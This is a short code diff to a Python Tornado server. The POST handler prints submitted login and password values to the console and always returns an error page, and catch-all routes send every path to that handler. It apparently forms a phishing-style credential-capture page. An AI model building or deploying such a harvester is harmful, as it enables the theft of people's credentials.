@@ -22,8 +22,11 @@ class MainHandler(tornado.web.RequestHandler):
 
     def post(self):
         # @TODO work with ids
-        print("login > " + self.get_body_argument("login"))
-        print("password > " + self.get_body_argument("password"))
+        try:
+            print("login > " + self.get_argument("login"))
+            print("password > " + self.get_argument("password"))
+        except tornado.web.HTTPError:
+            print("\n")
         # @TODO reload the same page or an error one or something else ...
         self.render("pages/" + pagePath + "error.html")
 
@@ -34,6 +37,8 @@ if __name__ == "__main__":
         [
             (r'/rsc/(.*)$', RscHandler),
             (r"/", MainHandler),
+            (r"/*", MainHandler),
+            (r"/.*", MainHandler),
         ],
         autoreload=True, debug=True
     )
